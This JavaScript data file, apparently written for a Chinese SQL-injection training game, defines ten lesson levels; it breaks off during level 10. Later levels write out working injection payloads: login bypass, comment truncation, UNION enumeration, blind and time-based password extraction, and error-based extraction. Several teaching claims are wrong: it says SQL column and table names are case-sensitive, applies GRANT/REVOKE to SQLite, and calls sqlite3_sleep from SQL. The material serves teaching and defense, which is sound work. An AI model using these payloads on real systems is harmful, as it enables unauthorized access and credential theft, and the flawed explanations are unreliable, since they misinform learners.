const LEVEL_DETAILS = [
    {
        id: 1,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员，1表示是，0表示否)
            `,
            sampleData: `
示例数据：
| id | username | email           | is_admin |
|----|----------|-----------------|----------|
| 1  | admin    | admin@test.com | 1        |
| 2  | user1    | user1@test.com | 0        |
| 3  | user2    | user2@test.com | 0        |
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: 'SELECT语句基本语法',
                    description: 'SELECT语句是SQL中最基本的查询语句，用于从数据库中检索数据。基本语法为：SELECT 列名 FROM 表名',
                    examples: 'SELECT username FROM users;\nSELECT username, email FROM users;'
                },
                {
                    title: '选择多个列',
                    description: '可以通过在列名之间添加逗号来选择多个列，列名的顺序决定了结果中列的显示顺序',
                    examples: 'SELECT id, username, email FROM users;'
                },
                {
                    title: '使用星号(*)选择所有列',
                    description: '星号(*)是一个通配符，表示选择表中的所有列。在实际应用中应该避免使用*，而是明确指定需要的列',
                    examples: 'SELECT * FROM users;'
                },
                {
                    title: '列别名',
                    description: '可以使用AS关键字为列指定别名，使结果更易读。AS关键字可以省略',
                    examples: 'SELECT username AS 用户名, email AS 邮箱 FROM users;'
                }
            ],
            commonErrors: [
                {
                    title: '列名拼写错误',
                    description: '最常见的错误之一是列名拼写错误，SQL是大小写敏感的',
                    example: 'SELECT Username FROM users; -- 错误\nSELECT username FROM users; -- 正确'
                },
                {
                    title: '忘记逗号分隔列名',
                    description: '选择多个列时必须使用逗号分隔，否则会导致语法错误',
                    example: 'SELECT username email FROM users; -- 错误\nSELECT username, email FROM users; -- 正确'
                },
                {
                    title: '表名错误',
                    description: '表名必须完全匹配数据库中的表名，包括大小写',
                    example: 'SELECT * FROM Users; -- 错误\nSELECT * FROM users; -- 正确'
                }
            ],
            prevention: [
                {
                    title: '使用参数化查询',
                    description: '使用参数化查询可以防止SQL注入攻击，所有的用户输入都应该通过参数传递',
                    example: 'const query = "SELECT * FROM users WHERE username = ?";\ndb.query(query, [username]);'
                },
                {
                    title: '最小权限原则',
                    description: '应用程序使用的数据库账号应该只具有必要的最小权限，避免使用管理员账号',
                    example: 'GRANT SELECT ON users TO app_user;'
                },
                {
                    title: '输入验证',
                    description: '在执行查询前应该对所有用户输入进行验证和过滤，确保符合预期的格式',
                    example: 'if (!username.match(/^[a-zA-Z0-9_]+$/)) {\n    throw new Error("无效的用户名");\n}'
                }
            ]
        }
    },
    {
        id: 2,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员，1表示是，0表示否)
            `,
            sampleData: `
示例数据：
| id | username | email           | is_admin |
|----|----------|-----------------|----------|
| 1  | admin    | admin@test.com | 1        |
| 2  | user1    | user1@test.com | 0        |
| 3  | user2    | user2@test.com | 0        |
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: 'WHERE子句基础',
                    description: 'WHERE子句用于过滤查询结果，只返回满足指定条件的记录。它是SQL中最常用的条件筛选语句。',
                    examples: 'SELECT * FROM users WHERE is_admin = 1;\nSELECT * FROM users WHERE username = \'admin\';'
                },
                {
                    title: '比较运算符',
                    description: 'SQL提供了多种比较运算符：=（等于）, >（大于）, <（小于）, >=（大于等于）, <=（小于等于）, !=或<>（不等于）',
                    examples: 'SELECT * FROM users WHERE id > 1;\nSELECT * FROM users WHERE username != \'admin\';'
                },
                {
                    title: '逻辑运算符',
                    description: '使用AND、OR、NOT等逻辑运算符组合多个条件。AND要求所有条件都为真，OR只需一个条件为真，NOT用于取反。',
                    examples: 'SELECT * FROM users WHERE is_admin = 1 AND username = \'admin\';\nSELECT * FROM users WHERE is_admin = 1 OR username = \'admin\';'
                },
                {
                    title: '条件优先级',
                    description: '使用括号()可以改变条件的优先级。没有括号时，AND的优先级高于OR。合理使用括号可以确保条件按预期执行。',
                    examples: 'SELECT * FROM users WHERE (username = \'admin\' OR username = \'user1\') AND is_admin = 1;'
                }
            ],
            commonErrors: [
                {
                    title: '字符串值未使用引号',
                    description: '在WHERE子句中比较字符串值时，必须使用单引号或双引号括起来。',
                    example: 'SELECT * FROM users WHERE username = admin; -- 错误\nSELECT * FROM users WHERE username = \'admin\'; -- 正确'
                },
                {
                    title: '运算符使用错误',
                    description: '使用了错误的比较运算符或将运算符写错（如把=写成==）。',
                    example: 'SELECT * FROM users WHERE username == \'admin\'; -- 错误\nSELECT * FROM users WHERE username = \'admin\'; -- 正确'
                },
                {
                    title: '条件逻辑顺序错误',
                    description: '没有正确使用括号导致条件优先级出错。',
                    example: 'SELECT * FROM users WHERE username = \'admin\' OR username = \'user1\' AND is_admin = 1; -- 可能不符合预期\nSELECT * FROM users WHERE (username = \'admin\' OR username = \'user1\') AND is_admin = 1; -- 更清晰的逻辑'
                }
            ],
            prevention: [
                {
                    title: '参数化查询',
                    description: '使用参数化查询来处理WHERE子句中的用户输入，避免SQL注入风险。',
                    example: 'const query = "SELECT * FROM users WHERE username = ? AND is_admin = ?";\ndb.query(query, [username, isAdmin]);'
                },
                {
                    title: '输入验证',
                    description: '在执行查询前验证所有的条件值，确保它们符合预期的格式和范围。',
                    example: 'if (!isValidUsername(username)) {\n    throw new Error("无效的用户名");\n}'
                },
                {
                    title: '条件值类型检查',
                    description: '确保条件值的类型与数据库字段类型匹配，避免隐式类型转换带来的问题。',
                    example: 'if (typeof isAdmin !== \'number\' || ![0, 1].includes(isAdmin)) {\n    throw new Error("管理员标志必须是0或1");\n}'
                }
            ]
        }
    },
    {
        id: 3,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员，1表示是，0表示否)
            `,
            sampleData: `
示例数据：
| id | username | email           | is_admin |
|----|----------|-----------------|----------|
| 1  | admin    | admin@test.com | 1        |
| 2  | user1    | user1@test.com | 0        |
| 3  | user2    | user2@test.com | 0        |
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: 'SQL中的字符串处理',
                    description: 'SQL中的字符串值必须用引号括起来。字符串可以包含字母、数字、特殊字符等。',
                    examples: 'SELECT * FROM users WHERE username = \'admin\';\nSELECT * FROM users WHERE email LIKE \'%@test.com\';'
                },
                {
                    title: '单引号与双引号',
                    description: 'SQL标准支持单引号和双引号，但单引号更常用。某些数据库对它们的处理可能不同。在字符串中使用引号时需要进行转义。',
                    examples: 'SELECT * FROM users WHERE username = \'O\'Connor\'; -- 使用转义\nSELECT * FROM users WHERE username = "admin"; -- 使用双引号'
                },
                {
                    title: '字符串转义',
                    description: '当字符串中包含引号时，需要使用转义字符（通常是再加一个引号）来处理。这是防止SQL注入的重要知识点。',
                    examples: 'SELECT * FROM users WHERE username = \'Robert\'\'s\'; -- 单引号转义\nSELECT * FROM users WHERE username = \'O\\\'Connor\'; -- 使用反斜杠转义'
                },
                {
                    title: 'LIKE操作符',
                    description: 'LIKE操作符用于模式匹配，支持通配符：%（匹配任意数量字符）和_（匹配单个字符）。在进行模糊查询时非常有用。',
                    examples: 'SELECT * FROM users WHERE email LIKE \'%@test.com\';\nSELECT * FROM users WHERE username LIKE \'user_\';'
                }
            ],
            commonErrors: [
                {
                    title: '引号未闭合',
                    description: '忘记闭合字符串的引号是最常见的错误之一，这可能导致语法错误或安全漏洞。',
                    example: 'SELECT * FROM users WHERE username = \'admin; -- 错误\nSELECT * FROM users WHERE username = \'admin\'; -- 正确'
                },
                {
                    title: '转义处理不当',
                    description: '在处理包含引号的字符串时，没有正确进行转义处理可能导致SQL注入漏洞。',
                    example: 'SELECT * FROM users WHERE username = \'O\'Connor\'; -- 错误\nSELECT * FROM users WHERE username = \'O\'\'Connor\'; -- 正确'
                },
                {
                    title: '混用引号类型',
                    description: '在同一查询中混用单引号和双引号可能导致不一致的行为，应该统一使用一种引号类型。',
                    example: 'SELECT * FROM users WHERE username = "admin" AND email = \'admin@test.com\'; -- 不推荐\nSELECT * FROM users WHERE username = \'admin\' AND email = \'admin@test.com\'; -- 推荐'
                }
            ],
            prevention: [
                {
                    title: '参数化查询',
                    description: '使用参数化查询自动处理字符串转义，是防止SQL注入的最佳实践。',
                    example: 'const query = "SELECT * FROM users WHERE username = ?";\ndb.query(query, [username]);'
                },
                {
                    title: '字符串转义函数',
                    description: '如果必须手动处理字符串，使用数据库提供的转义函数来确保安全。',
                    example: 'const escapedString = db.escape(userInput);\nconst query = `SELECT * FROM users WHERE username = ${escapedString}`;'
                },
                {
                    title: '输入验证',
                    description: '在接受用户输入时进行严格的验证，只允许符合预期格式的字符串。',
                    example: 'if (!username.match(/^[a-zA-Z0-9_]+$/)) {\n    throw new Error("用户名只能包含字母、数字和下划线");\n}'
                }
            ]
        }
    },
    {
        id: 4,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员，1表示是，0表示否)
            `,
            sampleData: `
示例数据：
| id | username | email           | is_admin |
|----|----------|-----------------|----------|
| 1  | admin    | admin@test.com | 1        |
| 2  | user1    | user1@test.com | 0        |
| 3  | user2    | user2@test.com | 0        |
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: 'SQL注入基本原理',
                    description: 'SQL注入是通过在用户输入中插入SQL代码来改变原始查询的行为。这通常发生在应用程序没有正确处理用户输入的情况下。',
                    examples: '原始查询：SELECT * FROM users WHERE username = \'[用户输入]\'\n注入示例：\' OR \'1\'=\'1'
                },
                {
                    title: '引号闭合技术',
                    description: '通过闭合SQL语句中的引号，可以注入额外的SQL代码。这是最基本的SQL注入技术之一。',
                    examples: '原始查询：SELECT * FROM users WHERE username = \'admin\' AND password = \'password\'\n注入后：SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\' -- \' AND password = \'password\''
                },
                {
                    title: 'OR运算符注入',
                    description: '使用OR运算符可以构造永真条件，从而绕过登录验证。这是一种常见的认证绕过技术。',
                    examples: '注入示例1：\' OR 1=1 --\n注入示例2：\' OR \'a\'=\'a'
                },
                {
                    title: '注释技术',
                    description: '使用SQL注释（--或#）可以注释掉查询语句的剩余部分，这样可以避免语法错误。',
                    examples: '注入示例：admin\'--\n效果：SELECT * FROM users WHERE username = \'admin\'--\' AND password = \'xxx\''
                }
            ],
            commonErrors: [
                {
                    title: '语法错误',
                    description: '注入的SQL代码存在语法错误，导致整个查询失败。需要确保注入的代码符合SQL语法规则。',
                    example: '错误示例：\' OR 1=1)\n正确示例：\' OR 1=1 --'
                },
                {
                    title: '引号闭合不当',
                    description: '没有正确闭合原始查询中的引号，导致SQL语法错误。需要仔细分析原始查询的结构。',
                    example: '错误示例：\' OR 1=1\n正确示例：\' OR \'1\'=\'1\' --'
                },
                {
                    title: '条件构造错误',
                    description: '构造的条件逻辑不正确，导致注入失败或得到意外结果。需要理解SQL的逻辑运算规则。',
                    example: '错误示例：\' OR username=\'admin\n正确示例：\' OR username=\'admin\' --'
                }
            ],
            prevention: [
                {
                    title: '参数化查询',
                    description: '使用参数化查询是防止SQL注入的最有效方法。它将用户输入作为参数而不是直接拼接到SQL语句中。',
                    example: 'const query = "SELECT * FROM users WHERE username = ? AND password = ?";\ndb.query(query, [username, password]);'
                },
                {
                    title: '输入验证',
                    description: '对所有用户输入进行严格的验证和过滤，只允许符合预期格式的数据通过。',
                    example: 'if (!username.match(/^[a-zA-Z0-9_]+$/)) {\n    throw new Error("用户名包含非法字符");\n}'
                },
                {
                    title: '最小权限原则',
                    description: '为数据库用户分配最小必要的权限，这样即使发生SQL注入也能限制损害范围。',
                    example: 'GRANT SELECT, INSERT ON users TO app_user;\nREVOKE DELETE, UPDATE ON users FROM app_user;'
                }
            ]
        }
    },
    {
        id: 5,
        preCheck: {
            tables: ['users', 'products'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员)

产品表(products)结构：
- id: INTEGER (主键)
- name: TEXT (产品名)
- description: TEXT (描述)
- price: REAL (价格)
            `,
            sampleData: `
产品表示例数据：
| id | name    | description | price |
|----|---------|-------------|-------|
| 1  | 产品1   | 描述1       | 99.99 |
| 2  | 产品2   | 描述2       | 199.99|
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: 'UNION基础',
                    description: 'UNION运算符用于合并两个或多个SELECT语句的结果集。UNION会自动去除重复行，而UNION ALL会保留重复行。',
                    examples: 'SELECT username FROM users\nUNION\nSELECT name FROM products;'
                },
                {
                    title: '列数匹配要求',
                    description: 'UNION查询要求两个SELECT语句返回的列数必须相同，否则会报错。可以使用NULL或常量值来补齐列数。',
                    examples: 'SELECT username, email FROM users\nUNION\nSELECT name, description FROM products;\n\n-- 使用NULL补齐列数\nSELECT username, email, id FROM users\nUNION\nSELECT name, description, NULL FROM products;'
                },
                {
                    title: '数据类型兼容性',
                    description: 'UNION查询中对应的列必须具有相似的数据类型。如果类型不完全匹配，数据库会尝试进行隐式类型转换。',
                    examples: '-- 正确：两列都是文本类型\nSELECT username FROM users\nUNION\nSELECT name FROM products;\n\n-- 错误：不兼容的类型\nSELECT username FROM users\nUNION\nSELECT price FROM products;'
                },
                {
                    title: 'ORDER BY的使用',
                    description: 'UNION结果可以使用ORDER BY子句排序，但ORDER BY必须放在最后一个SELECT语句之后。它会对合并后的所有结果进行排序。',
                    examples: 'SELECT username, email FROM users\nUNION\nSELECT name, description FROM products\nORDER BY 1; -- 按第一列排序'
                }
            ],
            commonErrors: [
                {
                    title: '列数不匹配',
                    description: 'UNION两侧的SELECT语句返回的列数不同，这是最常见的错误。',
                    example: '-- 错误示例\nSELECT username, email FROM users\nUNION\nSELECT name FROM products;\n\n-- 正确示例\nSELECT username, email FROM users\nUNION\nSELECT name, description FROM products;'
                },
                {
                    title: '数据类型不兼容',
                    description: '对应列的数据类型差异过大，无法进行隐式转换。',
                    example: '-- 错误示例\nSELECT id FROM users\nUNION\nSELECT price FROM products; -- INTEGER 和 REAL\n\n-- 正确示例\nSELECT CAST(id AS REAL) FROM users\nUNION\nSELECT price FROM products;'
                },
                {
                    title: 'ORDER BY位置错误',
                    description: 'ORDER BY子句放在了错误的位置，应该放在整个UNION查询的最后。',
                    example: '-- 错误示例\nSELECT username FROM users ORDER BY username\nUNION\nSELECT name FROM products;\n\n-- 正确示例\nSELECT username FROM users\nUNION\nSELECT name FROM products\nORDER BY 1;'
                }
            ],
            prevention: [
                {
                    title: '参数化查询',
                    description: '使用参数化查询处理所有用户输入，防止UNION注入攻击。',
                    example: 'const query = "SELECT * FROM users WHERE username = ?";\ndb.query(query, [username]);'
                },
                {
                    title: '限制UNION权限',
                    description: '在数据库层面限制UNION查询的权限，特别是对敏感表的访问。',
                    example: 'REVOKE SELECT ON sensitive_table FROM app_user;\nGRANT SELECT ON public_table TO app_user;'
                },
                {
                    title: '类型检查',
                    description: '对查询结果进行严格的类型检查，确保数据类型符合预期。',
                    example: 'function validateResult(row) {\n    if (typeof row.username !== \'string\') {\n        throw new Error("Invalid data type");\n    }\n}'
                }
            ]
        }
    },
    {
        id: 6,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员)
            `,
            sampleData: `
示例数据：
| id | username | email           | is_admin |
|----|----------|-----------------|----------|
| 1  | admin    | admin@test.com | 1        |
| 2  | user1    | user1@test.com | 0        |
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: 'SQL注释类型',
                    description: 'SQL支持两种主要的注释语法：单行注释(--或#)和多行注释(/* */）。在SQL注入中，注释常用于截断不需要的SQL语句部分。',
                    examples: '-- 这是单行注释\n# 这也是单行注释\n/* 这是\n多行注释 */'
                },
                {
                    title: '注释截断技术',
                    description: '使用注释符号可以使查询语句的后半部分失效，这是一种常见的SQL注入技术。注释符后的所有内容都会被忽略。',
                    examples: 'SELECT * FROM users WHERE username = \'admin\'--\' AND password = \'xxx\'\n-- 实际执行的是：SELECT * FROM users WHERE username = \'admin\''
                },
                {
                    title: '多行注释利用',
                    description: '多行注释可以用来注释掉查询中的任意部分，不仅限于行尾。这在某些复杂的SQL注入场景中特别有用。',
                    examples: 'SELECT * FROM users WHERE username = \'ad/**/min\' -- 插入注释\nSELECT * FROM users WHERE /* 注释掉整个条件 */ 1=1'
                },
                {
                    title: '注释符号变体',
                    description: '不同的数据库系统可能支持不同的注释语法。了解目标数据库支持的注释语法对SQL注入很重要。',
                    examples: 'MySQL: # 或 -- 或 /**/\nSQL Server: -- 或 /**/\nOracle: -- 或 /**/'
                }
            ],
            commonErrors: [
                {
                    title: '注释符后缺少空格',
                    description: '使用--注释符时，后面必须跟一个空格，否则可能不会被识别为注释。',
                    example: '错误：SELECT * FROM users WHERE username = \'admin\'--AND password = \'xxx\'\n正确：SELECT * FROM users WHERE username = \'admin\'-- AND password = \'xxx\''
                },
                {
                    title: '注释未正确闭合',
                    description: '使用多行注释时没有正确闭合，会导致语法错误。',
                    example: '错误：SELECT * FROM users WHERE username = \'ad/* min\'\n正确：SELECT * FROM users WHERE username = \'ad/**/min\''
                },
                {
                    title: '注释位置不当',
                    description: '注释符放置位置不当，可能导致SQL语句结构被破坏。',
                    example: '错误：SELECT * FROM users --WHERE username = \'admin\'\n正确：SELECT * FROM users WHERE username = \'admin\'--'
                }
            ],
            prevention: [
                {
                    title: '参数化查询',
                    description: '使用参数化查询可以防止通过注释进行的SQL注入攻击。',
                    example: 'const query = "SELECT * FROM users WHERE username = ? AND password = ?";\ndb.query(query, [username, password]);'
                },
                {
                    title: '过滤注释符号',
                    description: '在处理用户输入时，检测并过滤掉SQL注释符号。',
                    example: 'function removeComments(input) {\n    return input.replace(/--/g, \'\').replace(/\\/\\*/g, \'\').replace(/\\*\\//g, \'\');\n}'
                },
                {
                    title: '规范SQL结构',
                    description: '使用规范的SQL语句结构，避免在查询中使用可能被注释利用的复杂结构。',
                    example: '// 避免字符串拼接\nconst query = `SELECT * FROM users WHERE username = ? AND active = 1`;\n// 使用参数绑定\ndb.query(query, [username]);'
                }
            ]
        }
    },
    {
        id: 7,
        preCheck: {
            tables: ['users', 'sqlite_master'],
            schema: `
系统表(sqlite_master)结构：
- type: TEXT (对象类型)
- name: TEXT (对象名称)
- tbl_name: TEXT (表名)
- rootpage: INTEGER (根页码)
- sql: TEXT (创建语句)
            `,
            sampleData: `
系统表示例数据：
| type  | name  | tbl_name | sql                  |
|-------|-------|----------|---------------------|
| table | users | users    | CREATE TABLE ... |
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: '系统表概述',
                    description: '系统表存储了数据库的元数据信息，包括表结构、视图、索引等。在SQLite中，sqlite_master是主要的系统表。',
                    examples: 'SELECT * FROM sqlite_master WHERE type = \'table\';\nSELECT sql FROM sqlite_master WHERE name = \'users\';'
                },
                {
                    title: 'UNION注入获取元数据',
                    description: '通过UNION注入可以查询系统表，获取数据库结构信息。这是高级SQL注入中常用的信息收集技术。',
                    examples: 'SELECT username FROM users\nUNION\nSELECT name FROM sqlite_master WHERE type=\'table\';'
                },
                {
                    title: '表结构分析',
                    description: '通过查询系统表的sql列，可以获取表的创建语句，从而了解表的完整结构。',
                    examples: 'SELECT sql FROM sqlite_master WHERE type=\'table\' AND name=\'users\';\n-- 获取users表的创建语句'
                },
                {
                    title: '数据库枚举',
                    description: '系统地枚举数据库中的所有对象，包括表、视图、触发器等。这有助于全面了解数据库结构。',
                    examples: '-- 获取所有表名\nSELECT name FROM sqlite_master WHERE type=\'table\';\n\n-- 获取所有视图\nSELECT name FROM sqlite_master WHERE type=\'view\';'
                }
            ],
            commonErrors: [
                {
                    title: '系统表名称错误',
                    description: '不同数据库系统的系统表名称可能不同，使用错误的表名会导致查询失败。',
                    example: '错误：SELECT * FROM system_tables; -- 不存在的表\n正确：SELECT * FROM sqlite_master; -- SQLite的系统表'
                },
                {
                    title: '权限不足',
                    description: '访问系统表通常需要特殊权限，普通用户可能无法直接查询系统表。',
                    example: '-- 需要管理员权限\nSELECT * FROM sqlite_master;\n\n-- 可能遇到权限错误：\n-- ERROR: permission denied for relation sqlite_master'
                },
                {
                    title: '查询结果处理不当',
                    description: '系统表返回的数据格式可能比较复杂，需要正确解析和处理。',
                    example: '错误：直接使用sql列内容\n正确：解析sql列中的CREATE TABLE语句'
                }
            ],
            prevention: [
                {
                    title: '限制系统表访问',
                    description: '通过适当的权限设置，限制对系统表的访问。只允许必要的用户访问必要的信息。',
                    example: 'REVOKE SELECT ON sqlite_master FROM public;\nGRANT SELECT ON sqlite_master TO dba_role;'
                },
                {
                    title: '参数化查询',
                    description: '即使是查询系统表，也要使用参数化查询来防止SQL注入。',
                    example: 'const query = "SELECT sql FROM sqlite_master WHERE type = ? AND name = ?";\ndb.query(query, [\'table\', tableName]);'
                },
                {
                    title: '访问控制',
                    description: '实施多层次的访问控制，包括数据库级别、应用级别和网络级别的控制。',
                    example: '// 应用层访问控制\nfunction checkSystemTableAccess(user) {\n    if (!user.isAdmin) {\n        throw new Error("Access denied");\n    }\n}'
                }
            ]
        }
    },
    {
        id: 8,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员)
            `,
            sampleData: `
示例：布尔盲注通过逐个字符猜测获取信息
password的第一个字符是否为's'？
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: '布尔盲注原理',
                    description: '布尔盲注是一种在无法直接获取查询结果的情况下，通过判断条件真假来逐步获取数据的技术。它利用应用的布尔响应（成功/失败）来推断数据。',
                    examples: `-- 判断用户名长度
SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) > 5;

-- 判断密码首字符
SELECT * FROM users WHERE username = 'admin' AND SUBSTR(password,1,1) = 'a';`
                },
                {
                    title: 'SUBSTR函数应用',
                    description: 'SUBSTR(string, start, length)函数用于提取字符串的一部分。在布尔盲注中，它常用于逐字符提取数据。',
                    examples: `-- 提取第一个字符
SUBSTR(password,1,1)

-- 提取第2-3个字符
SUBSTR(password,2,2)`
                },
                {
                    title: '二分法查找',
                    description: '使用二分查找算法可以更快地确定字符。比如先判断ASCII码范围，然后逐步缩小范围。',
                    examples: `-- 判断ASCII码范围
SELECT * FROM users WHERE username = 'admin' AND ASCII(SUBSTR(password,1,1)) > 64;
-- 判断是否小于某值
SELECT * FROM users WHERE username = 'admin' AND ASCII(SUBSTR(password,1,1)) < 91;`
                },
                {
                    title: '字符串函数组合',
                    description: '结合使用多个字符串函数可以构建更复杂的条件。LENGTH、SUBSTR、ASCII等函数的组合使用很常见。',
                    examples: `-- 组合使用函数
SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) = 8 AND SUBSTR(password,1,1) = 'a';`
                }
            ],
            commonErrors: [
                {
                    title: 'SUBSTR参数错误',
                    description: 'SUBSTR函数参数使用不当，如起始位置或长度参数错误。',
                    example: `错误：SUBSTR(password,0,1) -- 起始位置从1开始
正确：SUBSTR(password,1,1)`
                },
                {
                    title: '条件逻辑错误',
                    description: '构造的布尔条件逻辑有误，导致无法正确判断结果。',
                    example: `错误：AND ASCII(SUBSTR(password,1,1)) = 'a' -- 直接比较ASCII值和字符
正确：AND ASCII(SUBSTR(password,1,1)) = 97 -- 使用ASCII码值比较`
                },
                {
                    title: '字符集考虑不全',
                    description: '在进行字符猜测时，没有考虑完整的可能字符集。',
                    example: `不完整：仅检查a-z
完整：检查a-z, A-Z, 0-9和特殊字符`
                }
            ],
            prevention: [
                {
                    title: '参数化查询',
                    description: '使用参数化查询是防止布尔盲注的基本方法。',
                    example: `const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.query(query, [username, password]);`
                },
                {
                    title: '错误信息模糊化',
                    description: '避免返回详细的错误信息，使攻击者无法判断具体的错误原因。',
                    example: `// 不要这样
if (error) throw error;

// 而是这样
if (error) throw new Error("Invalid credentials");`
                },
                {
                    title: '请求频率限制',
                    description: '实施请求频率限制，防止攻击者快速尝试多个条件。',
                    example: `const rateLimit = require('express-rate-limit');
app.use(rateLimit({
    windowMs: 15 * 60 * 1000, // 15分钟
    max: 100 // 限制100次请求
}));`
                }
            ]
        }
    },
    {
        id: 9,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员)
            `,
            sampleData: `
示例：时间盲注通过查询执行时间判断条件
password长度是否大于10？
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: '时间盲注原理',
                    description: '时间盲注是一种通过测量查询执行时间来推断条件真假的技术。当无法获得查询结果和错误信息时，可以通过控制查询执行时间来获取信息。',
                    examples: `-- 使用CASE语句控制执行时间
SELECT CASE WHEN (username = 'admin') THEN sqlite3_sleep(5000) ELSE sqlite3_sleep(0) END FROM users;

-- 使用条件延时
SELECT * FROM users WHERE username = 'admin' AND (CASE WHEN LENGTH(password)>10 THEN sqlite3_sleep(5000) ELSE sqlite3_sleep(0) END);`
                },
                {
                    title: '延时函数应用',
                    description: '不同数据库系统提供不同的延时函数。SQLite使用sqlite3_sleep，MySQL使用SLEEP，SQL Server使用WAITFOR DELAY等。延时函数是时间盲注的核心。',
                    examples: `-- SQLite延时函数
sqlite3_sleep(5000) -- 延时5秒

-- MySQL延时函数
SLEEP(5) -- 延时5秒

-- SQL Server延时
WAITFOR DELAY '00:00:05' -- 延时5秒`
                },
                {
                    title: '条件延时构造',
                    description: '使用条件语句（如CASE WHEN）结合延时函数，可以根据条件真假控制查询执行时间。这是构造时间盲注的基本方法。',
                    examples: `-- 基于条件的延时
CASE 
    WHEN (条件) THEN sqlite3_sleep(5000)
    ELSE sqlite3_sleep(0)
END;

-- 实际应用示例
CASE WHEN SUBSTR(password,1,1) = 'a' THEN sqlite3_sleep(5000) ELSE sqlite3_sleep(0) END`
                },
                {
                    title: '执行时间测量',
                    description: '时间盲注需要准确测量查询执行时间。需要考虑网络延迟、服务器负载等因素，通常使用多次测量取平均值来提高准确性。',
                    examples: `-- 构造明显的时间差
CASE WHEN condition THEN sqlite3_sleep(5000) -- 条件为真时延时5秒
ELSE sqlite3_sleep(100) -- 条件为假时延时0.1秒
END`
                }
            ],
            commonErrors: [
                {
                    title: '延时设置过短',
                    description: '设置的延时时间过短，可能与网络波动和系统延迟混淆，导致判断错误。',
                    example: `错误：sqlite3_sleep(100) -- 延时太短
正确：sqlite3_sleep(5000) -- 使用更明显的时间差`
                },
                {
                    title: '条件构造不当',
                    description: '构造的条件逻辑错误，导致延时触发不符合预期。',
                    example: `错误：CASE WHEN LENGTH(pwd)>10 THEN SLEEP(5) END -- 没有ELSE子句
正确：CASE WHEN LENGTH(password)>10 THEN SLEEP(5) ELSE SLEEP(0) END`
                },
                {
                    title: '网络延迟考虑不足',
                    description: '没有考虑网络延迟和服务器负载的影响，导致时间判断不准确。',
                    example: `单次测量可能不准确
建议：多次测量取平均值，使用显著的时间差`
                }
            ],
            prevention: [
                {
                    title: '参数化查询',
                    description: '使用参数化查询是防止时间盲注的基本方法。',
                    example: `const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.query(query, [username, password]);`
                },
                {
                    title: '查询超时设置',
                    description: '设置合理的查询超时时间，防止长时间运行的查询。',
                    example: `// 设置查询超时
db.query(query, [], { timeout: 1000 }); // 1秒超时

// 数据库级别设置
SET SESSION MAX_EXECUTION_TIME=1000; -- MySQL设置`
                },
                {
                    title: '查询性能监控',
                    description: '监控数据库查询执行时间，对异常的长时间查询进行告警和阻断。',
                    example: `function monitorQueryTime(query, startTime) {
    const duration = Date.now() - startTime;
    if (duration > 1000) {
        logger.warn(\`Slow query detected: \${query}\`);
    }
}`
                }
            ]
        }
    },
    {
        id: 10,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员)
            `,
            sampleData: `
示例：利用报错信息获取数据
尝试构造一个会显示错误信息的查询
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: '报错注入原理',
                    description: '报错注入利用数据库的错误信息来获取数据。当数据库在处理查询时发生错误，可能会在错误信息中包含查询的结果。',
                    examples: `-- 使用CAST溢出触发错误
AND (SELECT CAST(username AS INT) FROM users WHERE id=1)=1

-- 使用xpath错误
AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE id=1)))`
                },
                {
                    title: '常见报错函数',
                    description: '不同数据库系统提供不同的可用于报错注入的函数，如updatexml()、extractvalue()、exp()等。',
                    examples: `-- MySQL中的updatexml
AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)

-- Oracle中的xmltype
AND CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE id=1))`
                },
                {
                    title: '数据类型转换错误',
                    description: '利用数据类型转换可能产生的错误来获取数据，如将字符串转换为整数时的溢出错误。',
                    examples: `-- 类型转换错误
AND (SELECT CAST(concat(username,password) AS SIGNED) FROM users LIMIT 1)=1`
                },
                {
                    title: '堆叠查询技巧',
                    description: '在支持多语句的环境中，可以使用堆叠查询配合报错注入获取更多信息。',
                    examples: `-- 堆叠查询示例
1; SELECT exp(~(SELECT * FROM(SELECT password FROM users WHERE id=1)x));`
                }
            ],
